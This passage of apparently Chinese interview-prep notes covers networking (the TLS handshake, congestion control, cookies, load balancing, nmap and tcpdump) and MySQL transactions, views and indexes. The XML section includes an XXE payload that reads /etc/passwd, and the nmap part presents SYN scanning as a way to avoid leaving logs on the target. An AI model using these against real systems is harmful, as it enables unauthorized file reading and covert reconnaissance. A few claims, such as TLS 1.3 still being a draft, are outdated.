  * 浏览器开始查找浏览器中内置的受信任的证书发布机构CA，与服务器发来的证书中的颁发者CA比对，校验证书是否为合法机构颁发。有异常就报错。
  * 取出颁发者CA的公钥（CA.pub），对签名（Sign）解密，解出来的(S.pub')如果和服务器的公钥（S.pub）相同，相同说明合法。
  * 如果证书没有问题，那么就生成一个随机值（KEY）。然后用服务器的公钥（S.pub）对该随机值进行加密。
  
  ⑤传送加密信息（客户端用服务端的公钥加密了等会儿通讯要用的对称密钥）
  
  这部分传送的是用证书加密后的随机值（KEY），目的就是让服务端得到这个随机值（KEY），以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了。
  
  ⑥服务段解密信息（服务端用自己的私钥解密）
  
    服务端用私钥（S.pri）解密后，得到了客户端传过来的随机值（KEY），然后把接下来要发的内容通过该值（KEY）进行对称加密。
  
  ⑦传输加密后的信息（客户端，这是我要发的信息）
  
    这部分信息是服务段用KEY加密后的信息，可以在客户端被还原。
  
  ⑧客户端解密信息（好的，我收到了）
  
    客户端用KEY解密服务端传过来的信息，于是获取了解密后的内容。整个过程第三方即使监听到了数据，也束手无策。

#### 16、SSL 协议是什么/TLS是什么

* SSL(Secure Sockets Layer 安全的套接层), 1994年为 Netscape 所研发。其继任者为传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层与应用层之间对网络连接进行加密。
  * SSL协议可分为两层
    * SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持
    * SSL 握手协议（SSL Handshake Protocol）：它建立在 SSL 记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等
  * SSL 协议提供的服务主要有：
    * 认证用户和服务器，确保数据发送到正确的客户机和服务器；
    * 加密数据以防止数据中途被窃取；
    * 维护数据的完整性，确保数据在传输过程中不被改变
* TLS（Transport Layer Security，传输层安全）：其前身是 SSL，它最初的几个版本（SSL 1.0、SSL 2.0、SSL 3.0）由网景公司开发，1999年从 3.1 开始被 IETF 标准化并改名，发展至今已经有 TLS 1.0、TLS 1.1、TLS 1.2 三个版本。SSL3.0和TLS1.0由于存在安全漏洞，已经很少被使用到。TLS 1.3 改动会比较大，目前还在草案阶段，目前使用最广泛的是TLS 1.1、TLS 1.2。



#### 17、网络拥塞怎么处理

* 慢开始算法 
  * 在 TCP 刚刚连接好，开始发送 TCP 报文段时，先令拥塞窗口 cwnd=1， 即一个最大报文段长度MSS。而在每收到一个对新的报文段的确认后 ，将 cwnd 加 1，即增大一个MSS。用这样的方法逐步增大发送方的拥塞窗口 cwnd，可以使分组注入到网络的速率更加合理。
  * 例如， A 向 B 发送数据，当发送时 A 的拥塞窗口为 2，那么 A 一次可以发送两个 TCP 报文 段，当经过一个 RTT 后 （也称为一个传输轮次）， A 收到 B 对刚才两个报文的确认，于是就把拥塞窗口调整为 4 ， 下一次发送时就可以一次发送 4 个报文段。
  * 使用慢开始算法后，每经过一个传输轮次 （即往返时延 RTT)，拥塞窗口 cwnd 就会加倍，即cwnd 的大小呈指数形式增长。这样慢开始一直把拥塞窗口 cwnd 增大到一个规定的慢开始门限 ssthresh  (阈值），然后改用拥塞避免算法。
* 拥塞避免算法 拥塞避免算法的做法是：发送端的拥塞窗口 cwnd 每经过一个往返时延 Rπ就增加一个 MSS的大小，而不是加倍，使 cwnd 按线性规律缓慢增大（即加法增大 ） ， 而当出现一次超时（网络拥 塞）时， 则令慢开始门限 ssthresh 等于当前 cwnd 的一半（即乘法减小 ）。
  * 根据 cwnd 的大小执行不同的算法，可归纳如下：
    * 当 cwnd<ssthresh 时，使用慢开始算法。
    * 当 cwnd>ssthresh 时， 停止使用慢开始算法而改用拥塞避免算法。
    * 当 cwnd=ssthresh 时，既可使用慢开始算法，也可使用拥塞避免算法（通常做法） 

* 网络拥塞的处理
  当网络出现拥塞时，无论在慢开始阶段还是在拥塞避免阶段，只要发送方检测到超时事件的 发生（没有按时收到确认，重传计时器超时），就要把慢开始门限 ssthresh 设置为出现拥塞时的发送方cwnd值的一半（但不能小于 2 ） 。 然后把拥塞窗口 cwnd 重新设置为 1 ， 执行慢开始算法。这样做的目的就是要迅速减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够时间把队列中积压的分组处理完毕。

![image-20200304215035823](/Users/godspeed/Library/Application Support/typora-user-images/image-20200304215035823.png)

#### 18、XML

XML 指可扩展标记语言（e**X**tensible **M**arkup **L**anguage）。

XML 被设计用来传输和存储数据。

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<note>  
  <to>Tove</to>  
  <from>Jani</from>  
  <heading>Reminder</heading>  
  <body>Don't forget me this weekend!</body> 
</note>


```



它与HTML一样，都是SGML(Standard  Generalized  Markup  Language, 标准通用标记语言)。Xml是Internet环境中跨平台的，依赖于内容的技术，是当前处理结构化文档信息的有力工具。扩展标记语言XML是一种简单的数据存储语言，使用一系列简单的标记描述数据，而这些标记可以用方便的方式建立，虽然XML占用的空间比二进制数据要占用更多的空间，但XML极其简单易于掌握和使用。

**扩展**：基于xml的外部实体注入攻击xxe——XMLExternalEntity

xml 可以去访问外部的 url 资源，内部的系统文件等，这种行为叫做 xxe

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE root[
        <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>
```



#### 19、web server

Web服务器可以解析HTTP协议。当Web服务器接收到一个HTTP请求(request)，会返回一个HTTP响应(response)。

著名产品：nginx、apache

#### 20、cookie 是什么啊？有什么用处？安全么？

**前置概念：**http请求是无状态的。也就是说即使第一次和服务器连接后并且登录成功后，第二次请求服务器依然不能知道当前请求是哪个用户。

cookie的出现就是为了解决这个问题，第一次登录后服务器返回一些数据（cookie）给浏览器，然后浏览器保存在本地，当该用户发送第二次请求的时候，就会自动的把上次请求存储的cookie数据自动的携带给服务器，服务器通过浏览器携带的数据就能判断当前用户是哪个了。cookie存储的数据量有限，不同的浏览器有不同的存储大小，但一般不超过4KB。因此使用cookie只能存储一些小量的数据。

例如，在你的浏览器上随便访问一个网站，如百度，然后F12，切换到NETWORK选项卡下，刷新一下界面，你应该可以看到一些存储着的“key/value对”，他们会随每一个请求发送至同一个服务器，是一种在客户端保持状态的方案。

服务器可以利用Cookie包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。Cookie最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这些都是Cookies的功用。另一个重要应用场合是“购物车”之类处理。用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这些信息都会写入Cookie，以便在最后付款时提取信息

很显然 cookie 不怎么安全。

下图是我在访问淘宝时产生的一些cookie

![image-20200329163907472](/Users/godspeed/Library/Application Support/typora-user-images/image-20200329163907472.png)

**扩展：session是什么？**

session是保管在服务器端的一个数据结构，服务端对每个用户都会产生一个session，用来记录用户的状态

**再扩展：cookie和session结合使用**

web开发发展至今，cookie和session的使用已经出现了一些非常成熟的方案。在如今的市场或者企业里，一般有两种存储方式：

1、存储在服务端：通过cookie存储一个session_id（比如我上面淘宝截图的JSESSIONID），然后具体的数据则是保存在session中。如果用户已经登录，则服务器会在cookie中保存一个session_id，下次请求的时候，会把该session_id携带上来，服务器根据session_id在session库中获取用户的session数据。就能知道该用户到底是谁，以及之前保存的一些状态信息。这种专业术语叫做server side session。

2、将session数据加密，然后存储在cookie中。这种专业术语叫做client side session。flask（一种轻量级python开发框架）采用的就是这种方式，但是也可以替换成其他形式。

此外，如果客户端的浏览器禁用了 Cookie ，会使用一种叫做<u>URL重写</u>的技术来进行会话跟踪，即每次HTTP交互，URL后面都会被附加上一个诸如 sid=xxxxx 这样的参数，服务端据此来识别用户。

#### 21、什么是负载均衡？

负载均衡（Load Balance），意思是将负载（工作任务，访问请求）进行平衡、分摊到多个操作单元（服务器，组件）上进行执行。是解决高性能，单点故障（高可用），扩展性（水平伸缩）的终极解决方案。

常见的实现方式中，主要可以在应用层、传输层、网络层和数据传输层做文章。所以，工作在应用层的负载均衡，我们通常称之为七层负载均衡、工作在传输层的我们称之为四层负载均衡。

大致可以分为以下几种，其中最常用的是四层和七层负载均衡：

**二层负载均衡** 

负载均衡服务器对外依然提供一个VIP（虚IP），集群中不同的机器采用相同IP地址，但是机器的MAC地址不一样。当负载均衡服务器接受到请求之后，通过改写报文的目标MAC地址的方式将请求转发到目标机器实现负载均衡。

**三层负载均衡**

和二层负载均衡类似，负载均衡服务器对外依然提供一个VIP（虚IP），但是<u>集群中不同的机器采用不同的IP地址</u>。当负载均衡服务器接受到请求之后，根据不同的负载均衡算法，通过IP将请求转发至不同的真实服务器。

**四层负载均衡** 

四层负载均衡工作在OSI模型的传输层，由于在传输层，只有TCP/UDP协议，这两种协议中除了包含源IP、目标IP以外，还包含源端口号及目的端口号。四层负载均衡服务器在接受到客户端请求后，以后通过<u>修改数据包的地址信息（IP+端口号）</u>将流量转发到应用服务器。

**七层负载均衡** 

七层负载均衡工作在OSI模型的应用层，应用层协议较多，常用http、radius、dns等。七层负载就可以基于这些协议来负载。这些应用层协议中会包含很多有意义的内容。比如同一个Web服务器的负载均衡，除了根据IP加端口进行负载外，还可根据七层的URL、浏览器类别、语言来决定是否要进行负载均衡。

使用nginx配置负载均衡的关键代码

```
upstream test {
    server 192.168.0.105:80 weight=2;
    server 192.168.0.117:80 weight=2;
}
server {
  listen 80;
  server_name www.nginx.local.com;
  location / {
      root /var/www/html;
      index index.html index.php;
      proxy_pass http://test;
  }
}
```

#### 22、内部网关协议和外部网关协议

问法：

讲讲内部、外部网关协议有哪些
网络出现故障时，rip ospf 哪个传播的更快，为什么？只知道与自己相邻的路由表
rip 结点的最大距离？ 15

![image-20200304225646691](/Users/godspeed/Library/Application Support/typora-user-images/image-20200304225646691.png)

#### 23、HTTP请求中，GET和POST的区别？

* Get是不安全的，因为在传输过程，数据被放在请求的URL中；Post的所有操作对用户来说都是不可见的。

* Get传送的数据量较小，这主要是因为受URL长度限制（2000B以上，不同浏览器不一样）；Post传送的数据量较大，一般被默认为不受限制。

  GET请求长这样:`https://www.test.com/?a=1&b=1&c=1`

* Get限制Form表单的数据集的值必须为ASCII字符；而Post支持整个ISO10646字符集。

* Get执行效率却比Post方法好。

#### 24、路由和交换的区别

**路由器**：寻址，转发（依靠 IP 地址），工作在网络层

内有一份路由表，里面有它的寻址信息，它收到网络层的数据报后，会根据路由表和选路算法将数据报转发到下一站（可能是路由器、交换机、目的主机）

**交换机**：过滤，转发（依靠 MAC 地址），一般工作在数据链路层

交换机内有一张MAC表，里面存放着和它相连的所有设备的MAC地址，它会根据收到的数据帧的首部信息内的目的MAC地址在自己的表中查找，如果有就转发，如果没有就放弃

现在的路由器不但集成了交换机的功能，还包括DHCP、无线中继等功能。

**扩展：交换机的学习功能（华为面试）？**

最开始A访问B时，交换机不知道B连的哪个端口，会从接收端口以外的所有端口广播出去，同时把A对应的端口保存在MAC地址表中，以便以后有电脑访问A时可以直接转发数据。当B回应后就把B对应的端口也保存，对有保存条目的电脑以后就不用广播而是直接转发。

**再扩展：交换机的老化机制**

若交换机与某台主机长时间未通信，交换机就会把该主机的mac地址从mac地址表里删除掉，等下次通信时重新学习地址。

**再扩展：二层交换机**

工作于OSI模型的第2层(数据链路层)，故而称为二层交换机。二层交换技术是发展比较成熟，二层交换机属数据链路层设备，可以识别数据包中的MAC地址信息，根据MAC地址进行转发，并将这些MAC地址与对应的端口记录在自己内部的一个地址表中。

**三层交换机**

三层交换机就是具有部分路由器功能的交换机，三层交换机的最重要目的是加快大型局域网内部的数据交换，所具有的路由功能也是为这目的服务的，能够做到一次路由，多次转发。对于数据包转发等规律性的过程由硬件高速实现，而像路由信息更新、路由表维护、路由计算、路由确定等功能，由软件实现。三层交换技术就是二层交换技术+三层转发技术。

#### 25、频分复用如何避免干扰

在相邻的频率段之间插入空白（保护）频谱

#### 26、CSMA/CD和CSMA/CA是什么？

* CSMA/CD（Carrier Sense Multiple Access with Collision Detection，带冲突检测的载波侦听多路访问)

  可应用于总线式局域网。每一个站在发送数据之前要先检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不发送数据，以免发生冲突;如果没有，则发送。并且计算机在发送数据的同时边检测信道上是否有冲突发生。如果有，则采用截断二进制指数类型退避算法来等待一段随机时间后再次重发。总的来说，可概括为“先听后发，边听边发，冲突停发，随机重发”。

* CSMA/CA （Carrier Sense Multiple Access with Collision Avoid,带冲突避免的载波侦听多路访问）

  用于无线局域网802.11a/b/g/n等。

  发送包的同时不能检测到信道上有无冲突，只能尽量“避免”, 尽量减少碰撞发生的概率 。

  * 预约信道。

    发送方在发送数据的同时向其他站点通知自己传输数据需要的时间长度，以便让其他站点在这段时间内不发送数据，从而避免碰撞。

  * ACK帧

    所有站点在正确接收到发给自己的数据帧（ 除广播帧和组播帧） 后 ，都需要向发送方发回一个 ACK 帧，如果接收失败则不采取任何行动。发送方在发送完一个数据帧后，在 规定的时间内如果没有收到ACK 帧，则认为发送失败，将进行该数据帧的重发，直到收到 ACK 帧或者达到规定重发次数为止。

  * RTS/CTS 帧（Request to Send/Clear to Send）

    是可选的碰撞避免机制 ， 主要用于解决无线网中的“隐蔽站 ”问题 。

    

  **为什么不能只使用CSMA/CD呢**

  在无线局域网的环境下，不能简单地搬用 CSMA/CD 协议，特别是碰撞检测部分。这主要有两个原因 ：
  I ）接收信号的强度往往会远小于发送信号的强度，且在无线介质上信号强度动态变化范围很广，因此若要实现碰撞检测，那么在硬件上需要的花费就会过大 。
  2）在无线通信中 ， 并非所有的站点都能够听见对方，即 “隐蔽站”的问题 。

#### 27、如何查看电脑开放的端口？

> 扩展内容，把知识用到实战里

* `netstat -an | grep 3389`

* `nmap`

  * `-sS`   Tcp SYN Scan  不需要三次握手，速度快

    半开放扫描，Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高

  * `-sT` Tcp connect scan ，默认扫描模式，三次握手，需要调用系统的connect().

    这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息，由于它要完成3次握手，效率低，速度慢，建议使用-sS

  原理：

  * 内置强大的脚本引擎(NSE)，以支持Lua编程来扩展nmap的功能

  * 首先进行主机发现，找出活动主机，然后确定活动主机的端口状况
  * 根据端口扫描，确定占用该端口的应用程序及其版本信息

  例子：

  `nmap –sS –sU –T4 –top-ports 300 192.168.1.100`

  参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；-T4表示时间级别配置4级；–top-ports 300表示扫描最有可能开放的300个端口（TCP和UDP分别有300个端口）。

* 其他软件如scanport

#### 28、http长连接和短连接的区别

在HTTP/1.0中默认使用短连接。也就是说，客户端和服务器每进行一次HTTP操作，就建立一次连接，任务结束就中断连接。而从HTTP/1.1起，默认使用长连接，用以保持连接特性。

#### 29、http请求头的数据格式？

![image-20200331185019657](/Users/godspeed/Library/Application Support/typora-user-images/image-20200331185019657.png)

请求头 Request Headers

```
GET / HTTP/1.1
Host: 115.159.106.12
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

响应头 Response Headers

```
HTTP/1.1 200 OK
Date: Tue, 31 Mar 2020 10:54:44 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 1234
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

#### 30、linux下怎么抓流量(腾讯)

命令行可以用这个：

监听某个网卡上发到目的主机为192.168.1.1的流量，写入指定pcap中

` tcpdump -i  eth0 dst host 192.168.1.1 -w /home/target.pcap`

wireshark自然也是可以的



### 三、数据库

#### 1、事务

* 问法：引入事务是为了解决什么问题？

* 为了保证数据的一致性和正确性，我们需要添加事务管理机制进行管理。当对数据库的数据进行操作失败时，事务管理可以很好保证所有的数据回滚到原来的数据，如果操作成功，则保证所有需要更新的数据持久化。

* 最经典的例子：jeff 给jack转账1000元 比如jeff先扣除1000，然后宕机了，有电之后发现jack没有增加1000元，显然这是不对的，引入事务可以解决这个问题，在操作不成功后回滚。

  mysql：

  ```
  1. `START TRANSACTION;`可以开启事务（开启事务后会把所有的操作先存放到事务日志data目录下的ib_logfile0 ，ib_logfile01）
  2. 进行事务操作
  3. 关闭事务
  a. COMMIT提交事务：同步数据保存到数据库表
  b. ROLLBACK回滚事务：清空日志表
  ```

#### 2、ACID/数据库四大特性（高频）

* ACID ，指数据库事务正确执行的四个基本要素的缩写. 包含:原子性(Atomicity）、一致性（Consistency）、隔离性（Isolation）、持久性（Durability）。

* 原子性：整个事务中的所有操作，要么全部完成，要么全部不完成，不可能停滞在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。
* 一致性：在事务开始之前和事务结束以后，数据库的完整性约束没有被破坏。
* 隔离性：两个事务的执行是互不干扰的，一个事务不可能看到其他事务运行时，中间某一时刻的数据。
* 持久性：在事务完成以后，该事务对数据库所作的更改便持久的保存在数据库之中，并不会被回滚

#### 3、数据库系统和文件系统比较一下

> 理解为主

* 定义：
  * 文件系统
    * 操作系统在存储设备上管理、组织文件，存储文件信息的软件机构。
  * 数据库系统
    * 为适应数据处理的需要而发展起来，为实际应用提供数据，集存储、处理和管理为一身。

* 区别：

  |        区别        |              文件系统              |               数据库系统               |
  | :----------------: | :--------------------------------: | :------------------------------------: |
  |      数据组织      |         相互独立的数据文件         |                 结构化                 |
  |      数据冗余      |       冗余度大，浪费存储空间       | 可被多用户、多应用共享，减少了数据冗余 |
  | 数据和应用间的关系 | 特定应用，数据和程序之间缺乏独立性 |      实现了物理独立性和逻辑独立性      |
  |      数据共享      |            以文件为单位            |           以记录和字段为单位           |
  |      数据管理      |       操作系统提供的存取方法       |           使用数据库管理系统           |

* 联系：
  * 均为数据组织的管理技术（功能类似）
  * 数据库系统是在文件系统的基础上发展而来的（二者发展间的联系）
    

#### 4、规范化

规范化理论正是用来改造关系模式，通过分解关系模式来消除其中不合适的数据依赖，以解决插入异常、删除异常、更新异常和数据冗余问题

#### 5、数据模型有哪几种

关系模型、层次模型、网状模型

#### 6、视图

* 是否占用空间：基本不占用，只占用极少的空间记录视图的信息

* 视图本身只是一个定义了一个sql语句而已，并不会包含实际的数据。

* 视图是一个虚拟表，其内容由查询定义。同真实的表一样，视图包含一系列带有名称的列和行数据。但是，视图并不在数据库中以存储的数据值集形式存在

* **作用（重点，19年面试官提问）**

  * 安全原因，视图可以隐藏一些数据，如：社会保险基金表，可以用视图只显示姓名，地址，而不显示社会保险号和工资数等

  * 可使复杂的查询易于理解和使用,别人写好，你直接从视图里取数据

  * 提高重用性，以前我写好一个语句，退出客户端后，还想要同样的数据可能不一定找的回来，我们可以直接给需要频繁执行的语句创一个视图，有需求可以直接用

  * 对数据库重构，却不影响程序的运行。如因某需求，user被拆成usera和userb，该两张表的结构如下：

    测试表:usera有id，name，age字段

    测试表:userb有id，name，sex字段

      这时如果php端使用sql语句：select * from user;那就会提示该表不存在，这时该如何解决呢。解决方案：创建视图。以下sql语句创建视图：

    `create view user as select a.name,a.age,b.sex from usera as a, userb as b where a.name=b.name;`

    以上假设name都是唯一的。此时php端使用sql语句：select * from user;就不会报错什么的。这就实现了更改数据库结构，不更改脚本程序的功能了。

  * 让数据更加清晰。想要什么样的数据，就创建什么样的视图

以mysql为例子

* 创建

`create view test as select empno,ename,job from emp;`

* 查看

`select * from test;`

* 修改

`alter view test as select 语句;` 

* 删除

`　　　　drop view 视图名[,视图名…];`

* 重命名

`　　　　Rename table 视图名 to 新视图名;`

来看一个例子

给定表dept_emp

```sql
mysql> select * from dept_emp;
+--------+---------+------------+------------+
| emp_no | dept_no | from_date  | to_date    |
+--------+---------+------------+------------+
|  10001 | d001    | 1986-06-26 | 9999-01-01 |
|  10002 | d001    | 1996-08-03 | 9999-01-01 |
|  10003 | d004    | 1995-12-03 | 9999-01-01 |
|  10004 | d004    | 1986-12-01 | 9999-01-01 |
|  10005 | d003    | 1989-09-12 | 9999-01-01 |
|  10006 | d002    | 1990-08-05 | 9999-01-01 |
|  10007 | d005    | 1989-02-10 | 9999-01-01 |
|  10008 | d005    | 1998-03-11 | 2000-07-31 |
|  10009 | d006    | 1985-02-18 | 9999-01-01 |
|  10010 | d005    | 1996-11-24 | 2000-06-26 |
|  10010 | d006    | 2000-06-26 | 9999-01-01 |
+--------+---------+------------+------------+
11 rows in set (0.09 sec)

mysql> create view test as select emp_no from dept_emp;
//创建一个视图
Query OK, 0 rows affected (0.22 sec)

mysql> select * from test;
+--------+
| emp_no |
+--------+
|  10001 |
|  10002 |
|  10003 |
|  10004 |
|  10005 |
|  10006 |
|  10007 |
|  10008 |
|  10009 |
|  10010 |
|  10010 |
+--------+
11 rows in set (0.04 sec)

mysql> alter view test as select * from dept_emp;
//修改视图
Query OK, 0 rows affected (0.03 sec)

mysql> select * from test;
+--------+---------+------------+------------+
| emp_no | dept_no | from_date  | to_date    |
+--------+---------+------------+------------+
|  10001 | d001    | 1986-06-26 | 9999-01-01 |
|  10002 | d001    | 1996-08-03 | 9999-01-01 |
|  10003 | d004    | 1995-12-03 | 9999-01-01 |
|  10004 | d004    | 1986-12-01 | 9999-01-01 |
|  10005 | d003    | 1989-09-12 | 9999-01-01 |
|  10006 | d002    | 1990-08-05 | 9999-01-01 |
|  10007 | d005    | 1989-02-10 | 9999-01-01 |
|  10008 | d005    | 1998-03-11 | 2000-07-31 |
|  10009 | d006    | 1985-02-18 | 9999-01-01 |
|  10010 | d005    | 1996-11-24 | 2000-06-26 |
|  10010 | d006    | 2000-06-26 | 9999-01-01 |
+--------+---------+------------+------------+
11 rows in set (0.00 sec)

mysql> alter table dept_emp add column id varchar(20) not null;
//给表增加一列
Query OK, 0 rows affected (1.55 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql> select * from test;
//我们的视图并没有改变
+--------+---------+------------+------------+
| emp_no | dept_no | from_date  | to_date    |
+--------+---------+------------+------------+
|  10001 | d001    | 1986-06-26 | 9999-01-01 |
|  10002 | d001    | 1996-08-03 | 9999-01-01 |
|  10003 | d004    | 1995-12-03 | 9999-01-01 |
|  10004 | d004    | 1986-12-01 | 9999-01-01 |
|  10005 | d003    | 1989-09-12 | 9999-01-01 |
|  10006 | d002    | 1990-08-05 | 9999-01-01 |
|  10007 | d005    | 1989-02-10 | 9999-01-01 |
|  10008 | d005    | 1998-03-11 | 2000-07-31 |
|  10009 | d006    | 1985-02-18 | 9999-01-01 |
|  10010 | d005    | 1996-11-24 | 2000-06-26 |
|  10010 | d006    | 2000-06-26 | 9999-01-01 |
+--------+---------+------------+------------+
11 rows in set (0.00 sec)

mysql> select * from dept_emp;
//源表结构已经变了
+--------+---------+------------+------------+----+
| emp_no | dept_no | from_date  | to_date    | id |
+--------+---------+------------+------------+----+
|  10001 | d001    | 1986-06-26 | 9999-01-01 |    |
|  10002 | d001    | 1996-08-03 | 9999-01-01 |    |
|  10003 | d004    | 1995-12-03 | 9999-01-01 |    |
|  10004 | d004    | 1986-12-01 | 9999-01-01 |    |
|  10005 | d003    | 1989-09-12 | 9999-01-01 |    |
|  10006 | d002    | 1990-08-05 | 9999-01-01 |    |
|  10007 | d005    | 1989-02-10 | 9999-01-01 |    |
|  10008 | d005    | 1998-03-11 | 2000-07-31 |    |
|  10009 | d006    | 1985-02-18 | 9999-01-01 |    |
|  10010 | d005    | 1996-11-24 | 2000-06-26 |    |
|  10010 | d006    | 2000-06-26 | 9999-01-01 |    |
+--------+---------+------------+------------+----+
11 rows in set (0.01 sec)

mysql> show create view test;
//查看创建视图生成的sql语句
+------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+----------------------+
| View | Create View                                                                                                                                                                                                                                                | character_set_client | collation_connection |
+------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+----------------------+
| test | CREATE ALGORITHM=UNDEFINED DEFINER=`root`@`localhost` SQL SECURITY DEFINER VIEW `test` AS select `dept_emp`.`emp_no` AS `emp_no`,`dept_emp`.`dept_no` AS `dept_no`,`dept_emp`.`from_date` AS `from_date`,`dept_emp`.`to_date` AS `to_date` from `dept_emp` | utf8                 | utf8_general_ci      |
+------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+----------------------+
1 row in set (0.00 sec)
显然，select * -> 具体的字段，这解释了为什么select * 没有出现预期的效果
```



#### 8、数据库的死锁

是指两个或两个以上的进程在执行过程中,因争夺资源而造成的一种互相等待的现象,若无外力作用,它们都将无法推进下去.此时称系统处于死锁状态或系统产生了死锁,这些永远在互相等待的进程称为死锁进程

预防和避免方法参照操作系统里面的方法，思想差不多

#### 9、索引

* **优点**

  * 利用索引**快速访问**数据库表中的特定信息。

    例如，对数据库表中一个或多个列（例如，employee 表的姓氏列）的值进行排序。如果想按特定职员的姓来查找他或她，则与在表中搜索所有的行相比，索引有助于更快地获取信息。

  * 索引提供指针以指向存储在表中指定列的数据值，然后根据指定的排序次序排列这些指针。数据库使用索引的方式与使用书的目录很相似：通过搜索索引找到特定的值，然后跟随指针到达包含该值的行。

  * 在数据库关系图中，可以为选定的表创建、编辑或删除索引/键属性页中的每个索引类型。当保存附加在此索引上的表或包含此表的数据库关系图时，索引同时被保存。

  * 通常情况下，只有当**经常查询**索引列中的数据时，才需要在表上创建索引。

  * 索引**将占用磁盘空间**（注意和视图的区别），并且降低添加、删除和更新行的速度。不过在多数情况下，索引所带来的数据检索速度的优势大大超过它的不足之处。然而，如果应用程序非常频繁地更新数据，或磁盘空间有限，那么最好限制索引的数量。

* **缺点**

  虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件
  
* **使用了索引确不工作的情况/设置了索引但是会失效 **

  * 条件中有or，且有条件没有使用索引

  * like查询以%开头

  * 列类型是字符串，查询时漏加引号`''`

  * 创建多列索引（复合索引）后，不使用复合索引的第一部分（例子中的name）

    ```sql
    alter table student add index my_index(name, age)                                     
    select * from student where name = 'aaa'     // 会用到索引
    select * from student where age = 18          //  不会使用索引
    ```

我们来看mysql中索引使用的例子

* 创建索引

  `create index myindex on dept_emp(emp_no);`

* 查看索引

  `show index from dept_emp;`

  ![image-20200308234508909](/Users/godspeed/Library/Application Support/typora-user-images/image-20200308234508909.png)

* 我们来测试索引的性能如何

* 插入大量数据

  ```
  mysql > delimiter $$ //先把$$作为分隔符，方便我们写完整的代码
  mysql > create procedure myproc()
  begin   
  	declare num int;   
    set num=10011;   
  	while num <= 20000 do   
  		insert into dept_emp(emp_no,dept_no,from_date,to_date,id) values(num,'d007','1999-01-01', '9999-01-01',num*2);   
  		set num=num+1;  
  	end while;  
  end$$
  mysql > delimiter ; //变回来
  ```

* 开启运行时间检测

  `set profiling=1;`

  可以看到，索引给我们的速度带来了巨大的提升（本例中约12倍）

  ![image-20200308231857679](/Users/godspeed/Library/Application Support/typora-user-images/image-20200308231857679.png)

* 删除索引

  `drop index myindex on dept_emp;`

#### 10、哈希索引和B+树索引有什么区别(19年面试官提问)

> 这个考查的还是有点深度的，当然我们光从字面上可以讲个大概

* mysql有5大常见引擎（了解即可）

  * **MyISAM**
    * 适合选择密集型的表。筛选大量数据时非常迅速，这是它最突出的优点。
    * 适合插入密集型的表。允许同时选择和插入数据。例如：适合管理邮件或Web服务器日志数据。

  * **InnoDB**

    在mysql5.6版本以上被作为默认引擎，并且加入了行及锁定与外键约束。

    * 适合更新密集的表。InnoDB存储引擎特别适合处理多重并发的更新请求。
    * 事务。InnoDB存储引擎是支持事务的标准MySQL存储引擎。
    * 自动灾难恢复。与其它存储引擎不同，InnoDB表能够自动从灾难中恢复。
    * 外键约束。MySQL支持外键的存储引擎只有InnoDB。
    * 支持自动增加列AUTO_INCREMENT属性。

  * **MEMORY**

    * 好处：主要是因为速度，采用的逻辑存储是系统内存,极大的提高了储存数据表的性能；

    * 坏处：
      * 当mysqld守护进程崩溃时，所有的Memory数据都会丢失。
      * 此外，要求存储在Memory数据表里的数据使用的是长度不变的格式，这意味着不能使用BLOB和TEXT这样的长度可变的数据类型
    * 使用情形：
      * 目标数据较小，且被非常频繁地访问。在内存中存放数据，所以会造成内存的使用，可以通过参数max_heap_table_size控制Memory表的大小，设置此参数，就可以限制Memory表的最大大小。
      * 如果数据是临时的，而且必须立即使用，那么就可以存放在内存表中。
      * 存储在Memory表中的数据如果突然丢失，不会对应用服务产生实质的负面影响。
      * Memory同时支持散列索引和B树索引。B树索引的优于散列索引的是，可以使用部分查询和通配查询，也可以使用<、>和>=等操作符方便数据挖掘。散列索引进行“相等比较”非常快，但是对“范围比较”的速度就慢多了，因此散列索引值适合使用在=和<>的操作符中，不适合在<或>操作符中，也同样不适合用在order by子句中

  * **MERGE**
    * MERGE存储引擎是一组MyISAM表的组合，这些MyISAM表结构必须完全相同，所以就相当于一个集合器。
    * 比起其他储存引擎MERGE不是很优秀，但是在某些情况下MERGE还是非常的有用。对于服务器日志这种信息，一般常用的存储策略是将数据分成很多表，每个名称与特定的时间段相关。

  * **ARCHIVE**

